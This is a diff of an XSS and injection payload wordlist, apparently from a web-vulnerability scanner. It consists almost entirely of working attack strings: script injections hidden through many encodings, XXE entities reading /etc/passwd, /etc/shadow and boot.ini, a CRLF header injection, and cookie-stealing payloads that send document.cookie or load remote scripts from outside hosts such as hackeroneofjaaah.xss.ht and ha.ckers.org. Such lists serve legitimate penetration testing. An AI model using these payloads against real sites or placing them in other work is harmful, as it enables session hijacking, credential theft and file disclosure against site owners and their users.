XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
-<div id="x">XXX</div> <style>  #x{font-family:foo[bar;color:green;}  #y];color:red;{}  </style>
-&lt;A HREF=\"http&#58;//66&#46;102&#46;7&#46;147/\"&gt;XSS&lt;/A&gt;
-<h1><font color=blue>hellox worldss</h1>
-&#x0003c;
-<svg/ \/\/%20%20%20%20%20onload%20%20%20%20%20 =%20%20%20%20%20%20%20 window[490837..toString(1<<5)](atob('YWxlcnQoMSk='))>
-&lt;A HREF=&quot;http://1113982867/&quot;&gt;XSS&lt;/A&gt;
-&lt;SCRIPT \"a='&gt;'\" SRC=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;js\"&gt;&lt;/SCRIPT&gt;
-&lt;IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29&gt;
-"'><sc\ript>confirm(42)</script>
-<HTML><BODY>
-/'>
-&lt;A HREF=\"htt p&#58;//6 6&#46;000146&#46;0x7&#46;147/\"&gt;XSS&lt;/A&gt;
-&lt;SCRIPT a=`&gt;` SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;
-<x%0Aonxxx=1
-<div style="font-family:foo}color=red;">XXX
-<iframe style="xg-p:absolute;top:0;left:0;width:100%;height:100%" onmouseover="prompt(1)">
-<object onafterscriptexecute=confirm(0)>
-<table BACKGROUND="javascript:document.vulnerable=true;">
-<iframe src='https://testforiframe.site/'>
-alert&#x28;1&#x29
-jAvasCript:confirm(42)
-&lt;IMG SRC=&apos;vbscript:msgbox(&quot;XSS&quot;)&apos;&gt;
-<;SCRIPT SRC=http://ha.ckers.org/xss.js
-<link rel="import" href="test.svg" />
-<div draggable="true" ondragstart="event.dataTransfer.setData('text/plain','malicious code');"><h1>Drop me</h1></div><iframe src="http://www.example.org/dropHere.html"></iframe>
-LOL<style>*{/*all*/color/*all*/:/*all*/red/*all*/;/[0]*IE,Safari*[0]/color:green;color:bl/*IE*/ue;}</style>
-<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xee;</foo>
-<img src="http://31.media.tumblr.com/ae3ef754917fe39e9c1fec441c553c85/tumblr_nsa8jqTm7i1resp2ko1_500.gif"></img>
-</html>
-egal=
-<img src="http://38.media.tumblr.com/809d39daf44dd25ef7ce77706e44e953/tumblr_nuvz98USdD1resp2ko1_500.gif"></img>
-[1].find(alert)
-<;SCRIPT a=";blah"; ';'; SRC=";http://ha.ckers.org/xss.js";>;<;/SCRIPT>;
-"
-&lt;STYLE&gt;@import'http&#58;//ha&#46;ckers&#46;org/xss&#46;css';&lt;/STYLE&gt;
-'
-<svg><style>{font-family&colon;'<iframe/onload=confirm(1)>'
-<iframe width="420" height="315" src="https://www.youtube.com/embed/iUXAHc-ABoY?autoplay=1" frameborder="0" allowfullscreen></iframe>
 <var onmouseover="prompt(1)">On Mouse Over</var>
-&#X00003c;
-XXXXXXX
-&lt;SCRIPT SRC=http://ha.ckers.org/xss.js
-prompt(
-a="get";
-<div style="width: expression(document.vulnerable=true;);">
-<img src="https://i.imgur.com/bYmdHcX.gif"></img>
-<img src="mocha:document.vulnerable=true;">
-title=
-<;? echo(';<;SCR)';;
-INJECTX
-<IMGSRC=&#106;&#97;&#118;&#97;&<WBR>#115;&#99;&#114;&#105;&#112;&<WBR>#116;&#58;&#97;&#108;&#101;&<WBR>#114;&#116;&#40;&#39;&#88;&#83<WBR>;&#83;&#39;&#41>
-[]['\146\151\154\164\145\162']['\143\157\156\163\164\162\165\143\164\157\162']('\141\154\145\162\164\50\61\51')()
-href="data:text/html;charset=utf-7,+ADwAcwBjAHIAaQBwAHQAPg-confirm(42)+ADsAPA-/script+AD4-"	UTF-7/UTF-8 mix
-<OBJECT TYPE="text/x-scriptlet" DATA="http://hacker.com/xss.html">
-"src=
-<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/shadow">]><foo>&xee;</foo>
-%25u22%25u27%25u3e%25u3cscript%25u3econfirm(42)%25u3c/script%25u3e
-1<vmlframe xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute;width:100%;height:100% src=test.vml#xss></vmlframe>
-"><object+data=javascript%26%63%6f%6c%6f%6e%3b'straccessng'.replace('access',alert)>
-<svG/x=">"/oNloaD=confirm()//
-<link/rel=prefetch import href=data:q;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg>
-data:text/html;charset=utf-7;base64,Ij48L3RpdGxlPjxzY3JpcHQ+YWxlcnQoMTMzNyk8L3NjcmlwdD4=
-"'%25253e%25253cscript%25253econfirm(42)%25253c/script%25253e
-"><input onfocus=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vaGFja2Vyb25lb2ZqYWFhaC54c3MuaHQiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 autofocus>
-&#x00003c;
-<;LAYER SRC=";http://ha.ckers.org/scriptlet.html";>;<;/LAYER>;
-<A HREF="http://0x42.0x0000066.0x7.0x93/">XSS</A>
-&lt;? echo(&apos;&lt;SCR)&apos;;
-&lt;DIV STYLE=\"background-image&#58;\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028&#46;1027\0058&#46;1053\0053\0027\0029'\0029\"&gt;
-On Mouse Over​
-%u22%u27%u3e%u3cscript%u3econfirm(42)%u3c/script%u3e
-<body onload=prompt(123) >
-<object type="text/x-scriptlet" data="http://jsfiddle.net/XLE63/ "></object>
-<head></head><body>padding<bleh onclick="top[/al/.source+/ert/.source]	``">clickpadding</bleh></body>
-&#X00003C;
-&lt;A HREF=\"http&#58;//google&#58;ha&#46;ckers&#46;org\"&gt;XSS&lt;/A&gt;
-<iframe style="position:absolute;top:0;left:0;width:100%;height:100%" onmouseover="prompt(1)">
-a="get";b="URL(ja\"";c="vascr";d="ipt:ale";e="rt('XSS');\")";eval(a+b+c+d+e);
-<;IMG RC=&;#0000106&;#0000097&;#0000118&;#0000097&;#0000115&;#0000099&;#0000114&;#0000105&;#0000112&;#0000116&;#0000058&;#0000097&;#0000108&;#0000101&;#0000114&;#0000116&;#0000040&;#0000039&;#0000088&;#0000083&;#0000083&;#0000039&;#0000041>;
-&lt;SCRIPT a=\"&gt;\" SRC=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;js\"&gt;&lt;/SCRIPT&gt;
-href="data:                                          text/html;charset=utf-7;base64,K0FEdy1zY3JpcHQrQUQ0LWNvbmZpcm0oNDIpK0FEc0FQQS0vc2NyaXB0K0FENC0=">obfuscated UTF-7 in base64
-<a onclick="javascript:document.location='http://sn1persecurity.com/.testing/iframe_injection.php?cookie='+document.cookie;">INJECTX COOKIE STEALER!</a>
-&lt;EMBED SRC=&quot;http://ha.ckers.org/xss.swf&quot; AllowScriptAccess=&quot;always&quot;&gt;&lt;/EMBED&gt;
-<iframe src="https://crowdshield.com/.testing/iframe_injection.php?iframe_src=3" height="0" width="0"></iframe>//INJECTX
-<x%0Donxxx=1
-<;META HTTP-EQUIV=";refresh"; CONTENT=";0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K";>;
-<;OBJECT TYPE=";text/x-scriptlet"; DATA=";http://ha.ckers.org/scriptlet.html";>;<;/OBJECT>;
-src="http://www.site.com/XSS.js"></script>
-<body onclick=print()>
-<object data="http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf">?
-&#x03c
-<;SCRIPT SRC=//ha.ckers.org/.j>;
-<Input value = "XSS" type = text>
-<data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=
-%25u0022%25u0027%25u003e%25u003cscript%25u003econfirm(42)%25u003c/script%25u003e
-\"
-&lt;IMG SRC=&quot;mocha:[code]&quot;&gt;
-</TITLE><object/data=https://finickycold.htmlpasta.com>
-&#X00003c
-&lt;A HREF=\"//www&#46;google&#46;com/\"&gt;XSS&lt;/A&gt;
-&lt;A HREF=\"http&#58;//1113982867/\"&gt;XSS&lt;/A&gt;
-<iframe srcdoc='&lt;body onload=prompt&lpar;1&rpar;&gt;'>
-confirm(document.cookie)
-<a
-&lt;XSS STYLE=\"behavior&#58; url(xss&#46;htc);\"&gt;
-"onclick=prompt(8)>"@x.y
-<object allowscriptaccess="always" data="test.swf"></object>
-<OBJECT TYPE="text/x-scriptlet" DATA="http://ha.ckers.org/scriptlet.html"></OBJECT>
-<IMG SRC="http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode">
-<style TYPE="text/javascript">document.vulnerable=true;</style>
-exp/*<;XSS STYLE=';no\xss:noxss(";*//*";);
-<;SCRIPT a=";>';>"; SRC=";http://ha.ckers.org/xss.js";>;<;/SCRIPT>;
-<object data=javascript:window[490837..toString(1<<5)](atob('YWxlcnQoMSk='))>
-g'"></IFRAME>Hover the cursor to the LEFT of this Message</h1>&ParamHeight=250
-%2522%253E%253Csvg%2520o%256Eload%253Dalert%25281%2529%253E
-document.cookie(
-<;XML SRC=";http://ha.ckers.org/xsstest.xml"; ID=I>;<;/XML>;
-<a href="javascript#document.vulnerable=true;">
-<style/onload=&lt;!--&#09;&gt;&#10;alert&#10;&lpar;1&rpar;>
-Redirect 302 /a&#46;jpg http&#58;//victimsite&#46;com/admin&#46;asp&deleteuser
-<;IMG SRC=';vbscript:msgbox(";XSS";)';>;
-http://www.simpatie.ro/index.php?page=friends&member=781339&javafunctionname=Pageclick&javapgno=2 javapgno=2 ??XSS??
-<iframe/onreadystatechange=\u0061\u006C\u0065\u0072\u0074('\u0061') worksinIE>
-<iframe src=mhtml:http://html5sec.org/test.html!xss.html></iframe><iframe src=mhtml:http://html5sec.org/test.gif!xss.html></iframe>
-<form><textarea &#13; onkeyup='\u0061\u006C\u0065\u0072\u0074&#x28;1&#x29;'>
-<img src="javascript:document.vulnerable=true;">
-<? echo('<SCR)';
-XSS
-<;!--[if gte IE 4]>;
-&#X0003C
-top.
-<div style="background:url(/f#[a]oo/;color:red/*/foo.jpg);">X</div>
-<xml id="xss" src="%(htc)s"></xml> <label dataformatas="html" datasrc="#xss" datafld="payload"></label>
-<;IMG SRC=";livescript:[code]";>;
-%01Jav%09asc%09ript:https://DOMAIN/%250Acon%09firm%25%281%25%29
-alert&lpar;1&rpar;
-';';;!--";<;XSS>;=&;{()}
-&#060
-\";
-Redirect 302 /a.jpg http://victimsite.com/admin.asp&deleteuser
-&#34;&#62;<h1/onmouseover='\u0061lert(1)'>
-<object data="http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf">
-<bleh/onclick=top[/al/.source+/ert/.source]&Tab;``>click
-%22><svg%20onload=confirm(1);>
-<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=j&#97v&#97script&#x3A;&#97lert(1)>ClickMe
-&lt;SCRIPT&gt;document&#46;write(\"&lt;SCRI\");&lt;/SCRIPT&gt;PT SRC=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;js\"&gt;&lt;/SCRIPT&gt;
-<!-- open comment
-')
-\");
-&lt;A HREF=\"javascript&#058;document&#46;location='http&#58;//www&#46;google&#46;com/'\"&gt;XSS&lt;/A&gt;
-&lt;IFRAME SRC=http://ha.ckers.org/scriptlet.html &lt;
-document.
-'-eval("window['pro'%2B'mpt'](8)")-'
-<IMGSRC=&#0000106&#0000097&<WBR>#0000118&#0000097&#0000115&<WBR>#0000099&#0000114&#0000105&<WBR>#0000112&#0000116&#0000058&<WBR>#0000097&#0000108&#0000101&<WBR>#0000114&#0000116&#0000040&<WBR>#0000039&#0000088&#0000083&<WBR>#0000083&#0000039&#0000041>
-?"></script><base%20c%3D=href%3Dhttps:\mysite>
-<x OnXxx=1
+<img SRC=" &#14; javascript:document.vulnerable=true;">
 <http://onxxx%3D1/
+&lt;IMG SRC=&apos;vbscript:msgbox(&quot;XSS&quot;)&apos;&gt;
+<embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
+<meta
+<marquee+loop=1+width=0+onfinish='new+Function`al\ert\`1\``'>
+<iFrAMe/src \/\/onload = prompt(1)
+<FRAMESET><FRAME SRC="javascript:document.vulnerable=true;"></frameset>
+prompt(document.domain)
+Redirect 302 /a.jpg http://victimsite.com/admin.asp&;deleteuser
+&lt;SCRIPT SRC=//ha&#46;ckers&#46;org/&#46;js&gt;
+<;A HREF=";http://ha.ckers.org@google";>;XSS<;/A>;
+<SVG ONLOAD=&#97&#108&#101&#114&#116(1)>
+<a alt=42 href=
+&#x0003C
+<a href=" javascript:
+"><iframe srcdoc="&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#118;&#97;&#114;&#32;&#97;&#61;&#112;&#97;&#114;&#101;&#110;&#116;&#46;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#99;&#114;&#101;&#97;&#116;&#101;&#69;&#108;&#101;&#109;&#101;&#110;&#116;&#40;&#34;&#115;&#99;&#114;&#105;&#112;&#116;&#34;&#41;&#59;&#97;&#46;&#115;&#114;&#99;&#61;&#34;&#104;&#116;&#116;&#112;&#115;&#58;&#47;&#47;hackeroneofjaaah.xss.ht&#34;&#59;&#112;&#97;&#114;&#101;&#110;&#116;&#46;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#98;&#111;&#100;&#121;&#46;&#97;&#112;&#112;&#101;&#110;&#100;&#67;&#104;&#105;&#108;&#100;&#40;&#97;&#41;&#59;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;">
+&apos;&apos;;!--&quot;&lt;XSS&gt;=&amp;{()}
+&lt
+<details/open/ontoggle="self['wind'%2b'ow']['one'%2b'rror']=self['wind'%2b'ow']['ale'%2b'rt'];throw/**/self['doc'%2b'ument']['domain'];">
+<sVg oNloaD=write()>
+<?xml version="1.0" standalone="no"?><html xmlns="http://www.w3.org/1999/xhtml"><head><style type="text/css">@font-face {font-family: y; src: url("font.svg#x") format("svg");} body {font: 100px "y";}</style></head><body>Hello</body></html>
+");
+&lt;XML SRC=&quot;http://ha.ckers.org/xsstest.xml&quot; ID=I&gt;&lt;/XML&gt;
+&lt;LAYER SRC=\"http&#58;//ha&#46;ckers&#46;org/scriptlet&#46;html\"&gt;&lt;/LAYER&gt;
+/'>
+<details open ontoggle=window[490837..toString(1<<5)](atob('YWxlcnQoMSk='))>
+"onerror
+<div onmouseover='alert&lpar;1&rpar;'>DIV</div>
+<form action="" method="post"><input name="username" value="admin" /><input name="password" type="password" value="secret" /><input name="injected" value="injected" dirname="password" /><input type="submit"></form>
+&lt;!--&#91;if gte IE 4&#93;&gt;
+<///style///><span %2F onmousemove='alert&lpar;1&rpar;'>SPAN
+<div style="font-family:foo}color=red;">XXX
+<a href="javascript&colon;\u0061&#x6C;&#101%72t&lpar;1&rpar;"><button>
+alert&lpar;1&rpar;
+\";
+'
+<OBJECT TYPE="text/x-scriptlet" DATA="%(scriptlet)s"></OBJECT>
+<x OnXxx=1
+<img src=something onauxclick="new Function `al\ert\`xss\``">
+<x %6Fnxxx=1
+&#x2039;script&#x203A;
+&#0060
+al\u0065rt(1)
+egal=
+<;SCRIPT a=";blah"; ';'; SRC=";http://ha.ckers.org/xss.js";>;<;/SCRIPT>;
+<div
+<a href=javascript&colon;alert&lpar;document&period;cookie&rpar;>Click Here</a>
+"'><\script>confirm(42)</script>
+%01Jav%09asc%09ript:https://DOMAIN/%250Acon%09firm%25%281%25%29
+"><iframe%20src="http://google.com"%%203E
+<div style="font-family:'foo&#10;;color:red;';">LOL
+<;A HREF=";http://google:ha.ckers.org";>;XSS<;/A>;
+<;OBJECT TYPE=";text/x-scriptlet"; DATA=";http://ha.ckers.org/scriptlet.html";>;<;/OBJECT>;
+<object data=%22data:text/html;base64,PHNjcmlwdD4gdmFyIHhociA9IG5ldyBYTUxIdHRwUmVxdWVzdCgpOyB4aHIub3BlbignR0VUJywgJ2h0dHA6Ly94c3NtZS5odG1sNXNlYy5vcmcveHNzbWUyJywgdHJ1ZSk7IHhoci5vbmxvYWQgPSBmdW5jdGlvbigpIHsgYWxlcnQoeGhyLnJlc3BvbnNlVGV4dC5tYXRjaCgvY29va2llID0gJyguKj8pJy8pWzFdKSB9OyB4aHIuc2VuZCgpOyA8L3NjcmlwdD4=%22>
+<vmlframe xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute;width:100%;height:100% src=%(vml)s#xss></vmlframe>
+href="data:text/html;charset=utf-7,+ADw-script+AD4-confirm(42)+ADsAPA-/script+AD4-"	UTF-7
+'';!--"<XSS>=&{()}
+"-prompt(8)-"
+onclick=
+navigator.vibrate(500)
+<div style="font-family:foo{bar;background:url(http://foo.f/oo};color:red/*/foo.jpg);">X
+"onmouseover=
+'';!--\"&lt;XSS&gt;=&{()}
+'>//\\,<'>">">"*"
+<?xml version="1.0">
+"'><;(24)trela=daolno ;''=e>'=d
+%0D%0ALocation:%0D%0AContent-Type:text/html%0D%0AX-XSS-Protection%3a0%0D
+<body onload!#$%&()*~+-_.,:;?@[/|\]^`=document.vulnerable=true;>
+<iframe srcdoc="&lt;img src&equals;x:x onerror&equals;alert&lpar;1&rpar;&gt;" />
+&lt;A HREF=&quot;javascript:document.location=&apos;http://www.google.com/&apos;&quot;&gt;XSS&lt;/A&gt;
+link=
+<data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=
+/*iframe/src*/<iframe/src="<iframe/src=@"/onload=prompt(1) /*iframe/src*/>
+&lt;DIV STYLE=&quot;background-image:\0075\0072\006C\0028&apos;\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029&apos;\0029&quot;&gt;
+<x 1=">" onxxx=1
+<x onxxx%3D1
+&#x003c
+<iframe src=/ onload=eval(unescape(this.name.replace(/\/g,null))) name=fff%253Dnew%2520this.contentWindow.window.XMLHttpRequest%2528%2529%253Bfff.open%2528%2522GET%2522%252C%2522xssme2%2522%2529%253Bfff.onreadystatechange%253Dfunction%2528%2529%257Bif%2520%2528fff.readyState%253D%253D4%2520%2526%2526%2520fff.status%253D%253D200%2529%257Balert%2528fff.responseText%2529%253B%257D%257D%253Bfff.send%2528%2529%253B></iframe>
+href="data:text/html;charset=utf-7,+ADwAcwBjAHIAaQBwAHQAPg-confirm(42)+ADsAPA-/script+AD4-"	UTF-7/UTF-8 mix
+<table BACKGROUND="javascript:document.vulnerable=true;">
+&lt;A HREF=&quot;http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D&quot;&gt;XSS&lt;/A&gt;
+&lt;A HREF=\"http&#58;//www&#46;google&#46;com&#46;/\"&gt;XSS&lt;/A&gt;
+<div style="font-family:'foo[a];color:red;';">XXX</div>
+&#39;&#88;&#83;&#83;&#39;&#41;>
+a=\"get\";
+<;A HREF=";javascript:document.location=';http://www.google.com/';";>;XSS<;/A>;
+<div id="x">XXX</div><style>#x{font-family:foo[bar;color:green;}#y];color:red;{}</style>
+&lt;A HREF=&quot;http://1113982867/&quot;&gt;XSS&lt;/A&gt;
+<META HTTP-EQUIV="Link" Content="<%(css)s>; REL=stylesheet">
+&lt;XML SRC=\"xsstest&#46;xml\" ID=I&gt;&lt;/XML&gt;
+&#X3c
+<;IMG SRC=';vbscript:msgbox(";XSS";)';>;
+<base href=//0>
+&#x03c
+<~/XSS/*-*/STYLE=xss:e/**/xpression(window.location="http://www.procheckup.com/?sid="%2bdocument.cookie)>
+<img src="http://38.media.tumblr.com/tumblr_ls64yimLuz1r0ix14o1_400.gif"></img>
+<body ONLOAD=document.vulnerable=true;>
+<;A HREF=";//www.google.com/";>;XSS<;/A>;
+<div  style="\63&#9\06f&#10\0006c&#12\00006F&#13\R:\000072 Ed;color\0\bla:yellow\0\bla;col\0\00 \&#xA0or:blue;">XXX</div>
+<object data=javascript&colon;\u0061&#x6C;&#101%72t(1)>
+<iframe src="javascript:document.vulnerable=true; <
+[\xC0][\xBC]script>document.vulnerable=true;[\xC0][\xBC]/script>
+eval
+&#34;&#62;<svg><style>{-o-link-source&colon;'<body/onload=confirm(1)>'
+</font>/<svg><style>{src&#x3A;'<style/onload=this.onload=confirm(1)>'</font>/</style>
+<;IMG&#x0D;SRC&#x0D;=&#x0D;";&#x0D;j&#x0D;a&#x0D;v&#x0D;a&#x0D;s&#x0D;c&#x0D;r&#x0D;i&#x0D;p&#x0D;t&#x0D;:&#x0D;a&#x0D;l&#x0D;e&#x0D;r&#x0D;t&#x0D;&#x0D;';&#x0D;X&#x0D;S&#x0D;S&#x0D;';&#x0D;)&#x0D;";&#x0D;>;&#x0D;
+<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=j&#97v&#97script:&#97lert(1)>ClickMe
+INJECTXXXXXXXXXXX "'`();</test>=/* <!-- // #
+<div id="x">XXX</div> <style>  #x{font-family:foo[bar;color:green;}  #y];color:red;{}  </style>
+document.cookie(
+<;SCRIPT SRC=";http://ha.ckers.org/xss.jpg";>;<;/SCRIPT>;
+<HEAD><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD>+ADw-SCRIPT+AD4-%(payload)s;+ADw-/SCRIPT+AD4-
+"'%u3e%u3cscript%u3econfirm(42)%u3c/script%u3e
+<a href="http://attacker.org"><iframe src="http://example.org/"></iframe></a>
+<;META HTTP-EQUIV=";Link"; Content=";<;http://ha.ckers.org/xss.css>;; REL=stylesheet";>;
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file://c:/boot.ini">]><foo>&xee;</foo>
+//<form/action=javascript&#x3A;alert&lpar;document&period;cookie&rpar;><input/type='submit'>//
+src=
+<xml id="xss" src="%(htc)s"></xml> <label dataformatas="html" datasrc="#xss" datafld="payload"></label>
+<meta http-equiv="refresh" content="0;url=javascript:confirm(1)">
+a=alert,a(1)
+/* INJECTX
+<x%0Aonxxx=1
+<![CDATA[
+">
+<iframe src="https://crowdshield.com/.testing/xss_vuln.html"></iframe>//INJECTX
+<link/rel=prefetch import href=data:q;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg>
+[]['\146\151\154\164\145\162']['\143\157\156\163\164\162\165\143\164\157\162']('\141\154\145\162\164\50\61\51')()
+&lt;A HREF=\"//google\"&gt;XSS&lt;/A&gt;
+&lt;A HREF=\"http&#58;//0x42&#46;0x0000066&#46;0x7&#46;0x93/\"&gt;XSS&lt;/A&gt;
+&lt;SCRIPT SRC=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;jpg\"&gt;&lt;/SCRIPT&gt;
+<img src="blah>" onmouseover="document.vulnerable=true;">
+%253Csvg%2520o%256Eload%253Dalert%25281%2529%253E
+<IMG SRC='vbscript:msgbox(\"XSS\")'>
+<div style="width: expression(document.vulnerable=true;);">
+;
+${``[class extends[alert``]{}]}
+&#X0003c;
+<iframe src="vbscript:document.vulnerable=true;">
+&lt;IMG SRC=\"livescript&#058;&#91;code&#93;\"&gt;
+<link
+<x style="background:url('x&#1;;color:red;/*')">XXX</x>
+<x style="background:url('x[a];color:red;/*')">XXX</x>
+%CA%BA>%EF%BC%9Csvg/onload%EF%BC%9Dalert%EF%BC%881)>
+<embed code=%(scriptlet)s></embed>
+<iframe src=""/srcdoc='&lt;svg onload&equals;alert&lpar;1&rpar;&gt;'>
+"'><;(24)trela=daolno ;''=/e>'=d
+&lt;STYLE&gt;@import&apos;http://ha.ckers.org/xss.css&apos;;&lt;/STYLE&gt;
+<EMBED SRC="http://ha.ckers.org/xss.swf" AllowScriptAccess="always"></EMBED>
+<x style="behavior:url(test.sct)">
+&lt;SCRIPT SRC=http://ha.ckers.org/xss.js&gt;&lt;/SCRIPT&gt;
+</plaintext\></|\><plaintext/onmouseover=prompt(1)
+<form><textarea &#13; onkeyup='\u0061\u006C\u0065\u0072\u0074&#x28;1&#x29;'>
+"/>
+<x o%6Exxx=1
+&#X00003C
+<OBJECT TYPE="text/x-scriptlet" DATA="http://xss.rocks/scriptlet.html"></OBJECT>
+<style/onload=&lt;!--&#09;&gt;&#10;alert&#10;&lpar;1&rpar;>
+<w="/x="y>"/OndbLcLick=`<`[confir\u006d``]>z
+crowdshield
+<br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br>
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/shadow">]><foo>&xee;</foo>
+<x%09onxxx=1
+INJECTXXXXXXXXXXX
+<input onblur=focus() autofocus><input>
+&#x00003c;
+\"+
+<p
+</html>
+<IMGSRC=&#x6A&#x61&#x76&#x61&#x73&<WBR>#x63&#x72&#x69&#x70&#x74&#x3A&<WBR>#x61&#x6C&#x65&#x72&#x74&#x28&<WBR>#x27&#x58&#x53&#x53&#x27&#x29>
+&#X00003c
+<div style="background:url(/f#[a]oo/;color:red/*/foo.jpg);">X</div>
+<object data='data:text/html;;;;;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='></object>
+Set.constructor`alert\x28document.domain\x29```
+'">
+&lt;SCRIPT a=&quot;&gt;&quot; SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;
+<d3v/onauxclick=[2].some(confirm)>click
+<iframe src=http://ha.ckers.org/scriptlet.html <
+<style>BODY{-moz-binding:url("http://www.securitycompass.com/xssmoz.xml#xss")}</style>
+alert`1`
+&#x000003C;
+"autof<x>ocus o<x>nfocus=alert<x>(1)//
+prompt(document.cookie)
+"src=
+<marquee onstart='javascript:alert&#x28;1&#x29;'>^__^
+&#x3008;script&#x3009;
+<img SRC="javascript:document.vulnerable=true;">
+<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
+&lt;SCRIPT/XSS SRC=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;js\"&gt;&lt;/SCRIPT&gt;
+<object onafterscriptexecute=confirm(0)>
+<!doctype html><form><label>type a,b,c,d - watch the network tab/traffic (JS is off, latest NoScript)</label><br><input name="secret" type="password"></form><!-- injection --><svg height="50px"><image xmlns:xlink="http://www.w3.org/1999/xlink"><set attributeName="xlink:href" begin="accessKey(a)" to="//example.com/?a" /><set attributeName="xlink:href" begin="accessKey(b)" to="//example.com/?b" /><set attributeName="xlink:href" begin="accessKey(c)" to="//example.com/?c" /><set attributeName="xlink:href" begin="accessKey(d)" to="//example.com/?d" /></image></svg>
+</TITLE><object/data=https://finickycold.htmlpasta.com>
+<X onxxx=1
+&#x3c;
+<div style="font-family:foo}color=red;">XXX</div>
+<xml src="javascript:document.vulnerable=true;">
 <div style="font-family:foo{bar;background:url(http://foo.f/oo};color:red/*/foo.jpg);">X</div>
-&#X003C;
-<iframe src="http://sn1persecurity.com/.testing/xss_vuln.html"></iframe>//INJECTX
-\74svg o\156load\75alert\501\51\76
-<;A HREF=";http://0x42.0x0000066.0x7.0x93/";>;XSS<;/A>;
-<iframe src=http://xss.rocks/scriptlet.html <
-<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">
+Redirect 302 /a.jpg http://victimsite.com/admin.asp&amp;deleteuser
+<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;
+<body onload=confirm(123) >
+&lt;SPAN DATASRC=\"#xss\" DATAFLD=\"B\" DATAFORMATAS=\"HTML\"&gt;&lt;/SPAN&gt;
+onmouseover=\uFF41\uFF4C\uFF45\uFF52\uFF54\u1455\uFF14\uFF12\u1450
+<svg/onload=alert`INJECTX`>
+&lt;A HREF=&quot;http://google.com/&quot;&gt;XSS&lt;/A&gt;
+<;STYLE>;BODY{-moz-binding:url(";http://ha.ckers.org/xssmoz.xml#xss";)}<;/STYLE>;
+<style
+&#X000003c;
+<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:document.vulnerable=true></object>
+<img SRC='vbscript:document.vulnerable=true;'>
+http://www.simpatie.ro/index.php?page=friends&member=781339&javafunctionname=Pageclick&javapgno=2 javapgno=2 ??XSS??
+javascript:eval('var a=document.createElement(\'script\');a.src=\'https://hackeroneofjaaah.xss.ht\';document.body.appendChild(a)')
+<head><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD>+ADw-SCRIPT+AD4-document.vulnerable=true;+ADw-/SCRIPT+AD4-
+&lt;XSS STYLE=&quot;behavior: url(http://ha.ckers.org/xss.htc);&quot;&gt;
